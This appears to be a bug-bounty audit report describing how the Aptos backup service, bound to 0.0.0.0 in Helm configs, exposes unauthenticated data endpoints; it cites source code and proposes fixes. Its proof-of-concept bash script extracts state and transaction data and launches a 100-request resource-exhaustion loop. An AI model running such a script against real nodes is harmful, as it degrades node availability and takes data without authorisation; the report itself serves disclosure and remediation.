# Audit Report

## Title
Backup Service Network Exposure Through 0.0.0.0 Binding Enables Unauthenticated Data Access and Resource Exhaustion

## Summary
The Aptos backup service, when configured to bind to `0.0.0.0:6186` in production deployments, exposes complete blockchain data through unauthenticated HTTP endpoints accessible from any network interface. This violates the documented localhost-only security model and enables unauthorized data extraction and potential denial-of-service attacks against validator nodes.

## Finding Description

The backup service is designed to be localhost-only by default, as documented in the storage configuration [1](#0-0) , which explicitly states "the port is open to only the localhost."

The default configuration properly binds to localhost: [2](#0-1) 

However, production Helm chart configurations override this secure default and bind to all network interfaces: [3](#0-2)  and [4](#0-3) 

The backup service exposes nine unauthenticated HTTP endpoints that provide complete access to blockchain data: [5](#0-4) 

There is no authentication mechanism implemented in the service: [6](#0-5) 

**Attack Vectors:**

1. **Information Disclosure**: Attackers can query sensitive endpoints including:
   - `/state_snapshot/{version}` - complete state dumps
   - `/transactions/{start}/{count}` - transaction history
   - `/db_state` - internal database metadata
   
2. **Resource Exhaustion**: Repeated requests to `/state_snapshot` or `/state_snapshot_chunk` endpoints can consume significant bandwidth and CPU resources, degrading validator node performance.

3. **Reconnaissance**: The `/db_state` endpoint exposes internal node state that aids attack planning.

## Impact Explanation

This issue qualifies as **High Severity** under the Aptos Bug Bounty criteria:

- **Validator node slowdowns**: Repeated large state snapshot requests can significantly degrade node performance by exhausting bandwidth and CPU resources processing serialization requests.

- **Significant protocol violations**: The service bypasses normal P2P synchronization protocols, allowing bulk data extraction without rate limiting or peer reputation mechanisms.

While blockchain data is inherently public, the ease of bulk extraction and lack of rate limiting creates a practical attack vector against node availability that doesn't exist in normal P2P operations.

## Likelihood Explanation

**Likelihood: Medium-High**

In containerized Kubernetes deployments, the service is exposed via ClusterIP (internal only) [7](#0-6) , providing network-level isolation. However:

1. **Bare metal/VM deployments**: Any deployment outside Kubernetes with `0.0.0.0` binding is directly exploitable from the network if firewall rules are misconfigured.

2. **Kubernetes pod compromise**: A compromised pod within the cluster can access the service.

3. **Network boundary failures**: Any breach of network perimeter protections exposes the service.

The attack requires only simple HTTP GET requests - no special tools or deep protocol knowledge needed.

## Recommendation

Implement defense-in-depth by adding authentication even for internal access:

1. **Short-term fix**: Add explicit documentation warning about the security implications of binding to `0.0.0.0` and recommend using network policies or firewall rules.

2. **Medium-term fix**: Implement token-based authentication similar to the admin service pattern, requiring a shared secret for access.

3. **Long-term fix**: Add rate limiting to prevent resource exhaustion attacks, and implement request size limits on snapshot endpoints.

**Code Fix Example** (conceptual):

```rust
// In storage/backup/backup-service/src/lib.rs
pub fn start_backup_service(
    address: SocketAddr, 
    db: Arc<AptosDB>,
    auth_token: Option<String>  // Add authentication token
) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler)
        .and(warp::header::optional::<String>("Authorization"))
        .and_then(move |auth: Option<String>| {
            verify_auth(auth, auth_token.clone())
        });
    // ... rest of implementation
}
```

Additionally, update production configurations to strongly recommend binding to specific internal interfaces rather than `0.0.0.0` when possible, and ensure Kubernetes NetworkPolicies explicitly restrict access to the backup service port.

## Proof of Concept

```bash
#!/bin/bash
# Exploit script demonstrating unauthenticated data access

TARGET="http://vulnerable-node-ip:6186"

# 1. Reconnaissance - get DB state
echo "[*] Fetching DB state metadata..."
curl -s "$TARGET/db_state" | xxd | head -20

# 2. Extract state snapshot (100 items at version 1000)
echo "[*] Extracting state snapshot..."
curl -s "$TARGET/state_snapshot_chunk/1000/0/100" > state_dump.bin
echo "Downloaded $(wc -c < state_dump.bin) bytes"

# 3. DoS attack - repeatedly request large snapshots
echo "[*] Launching resource exhaustion attack..."
for i in {1..100}; do
    curl -s "$TARGET/state_snapshot/1000000" > /dev/null &
done
echo "Launched 100 concurrent snapshot requests"

# 4. Extract transaction history
echo "[*] Extracting transaction history..."
curl -s "$TARGET/transactions/0/10000" > transactions.bin
echo "Downloaded $(wc -c < transactions.bin) bytes of transactions"
```

This demonstrates that any attacker with network access can:
- Extract complete blockchain state
- Query internal database metadata  
- Launch resource exhaustion attacks via repeated large requests
- Bypass normal P2P rate limiting and authentication

**Notes**

The vulnerability exists at the intersection of configuration and implementation. While the code correctly defaults to localhost-only binding, production configurations override this for operational convenience without implementing compensating controls (authentication, rate limiting). The Kubernetes ClusterIP service provides network isolation but represents a single layer of defense. The lack of application-level authentication violates defense-in-depth principles and creates unnecessary risk in deployment scenarios outside Kubernetes or when network boundaries are compromised.

### Citations

**File:** storage/README.md (L64-66)
```markdown
  # Address the backup service listens on. By default the port is open to only
  # the localhost, so the backup cli tool can only access data in the same host.
  backup_service_address: "127.0.0.1:6186"
```

**File:** config/src/config/storage_config.rs (L436-436)
```rust
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L16-16)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L68-68)
```yaml
  backup_service_address: "0.0.0.0:6186"
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L17-134)
```rust
static DB_STATE: &str = "db_state";
static STATE_RANGE_PROOF: &str = "state_range_proof";
static STATE_SNAPSHOT: &str = "state_snapshot";
static STATE_ITEM_COUNT: &str = "state_item_count";
static STATE_SNAPSHOT_CHUNK: &str = "state_snapshot_chunk";
static STATE_ROOT_PROOF: &str = "state_root_proof";
static EPOCH_ENDING_LEDGER_INFOS: &str = "epoch_ending_ledger_infos";
static TRANSACTIONS: &str = "transactions";
static TRANSACTION_RANGE_PROOF: &str = "transaction_range_proof";

pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // GET db_state
    let bh = backup_handler.clone();
    let db_state = warp::path::end()
        .map(move || reply_with_bcs_bytes(DB_STATE, &bh.get_db_state()?))
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transaction_range_proof/<first_version>/<last_version>
    let bh = backup_handler;
    let transaction_range_proof = warp::path!(Version / Version)
        .map(move |first_version, last_version| {
            reply_with_bcs_bytes(
                TRANSACTION_RANGE_PROOF,
                &bh.get_transaction_range_proof(first_version, last_version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // Route by endpoint name.
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** terraform/helm/fullnode/templates/service.yaml (L53-54)
```yaml
  - name: backup
    port: 6186
```
